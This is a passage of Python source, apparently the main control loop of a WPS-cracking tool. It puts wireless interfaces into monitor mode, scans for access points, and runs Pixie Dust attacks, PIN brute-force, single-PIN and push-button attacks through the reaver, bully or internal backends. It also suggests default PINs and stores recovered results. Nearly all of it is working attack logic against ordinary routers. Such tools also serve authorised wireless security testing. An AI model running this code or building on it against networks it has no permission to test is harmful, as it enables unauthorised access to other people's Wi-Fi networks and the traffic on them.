                            print_debug=args.verbose, db=db,
                            json_mode=args.json, trace_log=args.trace_log,
                            pixiewps_timeout=args.timeout, cool_down=args.cool)
                        try:
                            comp.single_connection(bssid=args.bssid, pbc_mode=True)
                        finally:
                            comp.cleanup()
                    elif args.backend == 'reaver':
                        attacker_cls = ReaverAttacker
                        if not attacker_cls.is_available():
                            die('reaver is not installed or not in PATH')
                        print(f'[*] Switching {args.interface} to monitor mode…')
                        mon_iface = setup_monitor_mode(args.interface)
                        try:
                            attacker = attacker_cls(
                                mon_iface, verbose=args.verbose,
                                timeout=args.timeout, delay=args.delay,
                                json_mode=args.json)
                            res = attacker.pbc(args.bssid, channel=args.channel)
                            _handle_backend_result(
                                res, args.bssid or res.essid or 'PBC-AP', db=db,
                                save_result=args.write, reports_dir=reports_dir,
                                json_mode=args.json)
                        finally:
                            print(f'[*] Restoring {args.interface} to managed mode…')
                            teardown_monitor_mode(mon_iface, args.interface)
                    else:
                        die('Bully does not support PBC mode. Use internal or reaver backend.')
                else:
                    if not args.bssid:
                        try:
                            with open(args.vuln_list, 'r',
                                      encoding='utf-8') as f:
                                vuln_list = f.read().splitlines()
                        except FileNotFoundError:
                            vuln_list = []
                        scanner = WiFiScanner(
                            args.interface, vuln_list,
                            reverse_scan=args.reverse_scan, db=db,
                            min_rssi=args.min_rssi, band=args.band)
                        if not args.loop:
                            print('[*] BSSID not specified (--bssid) — '
                                  'scanning for available networks')
                        args.bssid = scanner.prompt_network()
                        selected_vuln = scanner.selected_vuln
                        selected_chipset = scanner.selected_chipset
                        selected_wps = scanner.selected_wps
                        if not selected_channel:
                            selected_channel = scanner.selected_channel

                    if not args.bssid:
                        if not args.loop:
                            break
                        continue

                    if not selected_wps:
                        print(f"[!] {args.bssid} has no WPS — cannot attack with "
                              f"{args.backend} backend. Choose another target.")
                        if not args.loop:
                            break
                        args.bssid = None
                        continue

                    reports_dir = os.path.join(
                        os.path.dirname(os.path.realpath(__file__)), 'reports')

                    if args.backend in (BACKEND_REAVER, BACKEND_BULLY):
                        attacker_cls = ReaverAttacker if args.backend == BACKEND_REAVER else BullyAttacker
                        if not attacker_cls.is_available():
                            die(f'{args.backend} is not installed or not in PATH')

                        print(f'[*] Switching {args.interface} to monitor mode…')
                        mon_iface = setup_monitor_mode(args.interface)
                        print(f'[+] Monitor interface: {mon_iface}')
                        try:
                            attacker = attacker_cls(
                                mon_iface, verbose=args.verbose,
                                timeout=args.timeout, delay=args.delay,
                                json_mode=args.json)

                            pixiemode = args.pixie_dust
                            pin = args.pin

                            if not pin and not args.bruteforce and not pixiemode and selected_vuln:
                                chipset = selected_chipset or 'unknown chipset'
                                print(f'[!] Target {args.bssid} looks Pixie Dust vulnerable ({chipset}).')
                                ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
                                if ans != 'n':
                                    pixiemode = True

                            if not pin and not args.bruteforce and not pixiemode:
                                known = db.known_pin(args.bssid)
                                if known:
                                    print(f'[i] Known PIN in DB for {args.bssid}: {known}')
                                    pin = known
                                else:
                                    generator = WPSpin()
                                    pins = generator.getSuggestedUnique(args.bssid)
                                    if len(pins) > 1:
                                        print(f'Suggested PINs for {args.bssid}:')
                                        print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
                                        for i, p in enumerate(pins):
                                            print('{:<3} {:<10} {:<}'.format(
                                                f'{i + 1})', p['pin'], p['name']))
                                        choice = input('Select PIN (or Enter for Pixie Dust / Brute-force): ').strip()
                                        if choice.isdigit() and 1 <= int(choice) <= len(pins):
                                            pin = pins[int(choice) - 1]['pin']
                                    elif len(pins) == 1:
                                        pin = pins[0]['pin']

                            res = None
                            if pixiemode or (not pin and not args.bruteforce):
                                res = attacker.pixie_dust(args.bssid, channel=selected_channel)
                                if not res.success and not pin and not args.bruteforce:
                                    print(f'[-] Pixie Dust attack failed with {args.backend}')
                                    if input('[?] Fall back to online brute-force? [y/N] ').strip().lower() == 'y':
                                        res = attacker.bruteforce(
                                            args.bssid, channel=selected_channel, start_pin=args.pin)
                            elif pin:
                                res = attacker.single_pin(args.bssid, pin, channel=selected_channel)
                            elif args.bruteforce:
                                res = attacker.bruteforce(
                                    args.bssid, channel=selected_channel, start_pin=args.pin)

                            if res is not None:
                                _handle_backend_result(
                                    res, args.bssid, db=db, save_result=args.write,
                                    reports_dir=reports_dir, json_mode=args.json)
                            else:
                                print('[-] No attack mode selected for external backend')
                        finally:
                            print(f'[*] Restoring {args.interface} to managed mode…')
                            teardown_monitor_mode(mon_iface, args.interface)

                    else:
                        comp = Companion(
                            args.interface, args.write,
                            print_debug=args.verbose, db=db,
                            json_mode=args.json, trace_log=args.trace_log,
                            pixiewps_timeout=args.timeout, cool_down=args.cool)
                        try:
                            comp.target_is_pixie_vuln = selected_vuln
                            comp.target_chipset = selected_chipset
                            if args.bruteforce:
                                comp.smart_bruteforce(
                                    args.bssid, args.pin, args.delay,
                                    loop=args.loop,
                                    auto_resume=args.resume)
                            else:
                                comp.single_connection(
                                    args.bssid, args.pin, args.pixie_dust,
                                    args.pbc, args.show_pixie_cmd,
                                    args.pixie_force)
                        finally:
                            comp.cleanup()
                if not args.loop:
                    break
                args.bssid = None
            except KeyboardInterrupt:
                if args.loop:
                    if input('\n[?] Exit the script '
                             '(otherwise continue to AP scan)? [N/y] '
                             ).lower() == 'y':
                        print('Aborting…')
                        break
                    args.bssid = None
                else:
                    print('\nAborting…')
                    break
    finally:
        if args.iface_down:
            ifaceUp(args.interface, down=True)
        if args.mtk_wifi:
            try:
                Path('/dev/wmtWifi').write_text('0')
            except Exception:
                pass
        db.close()
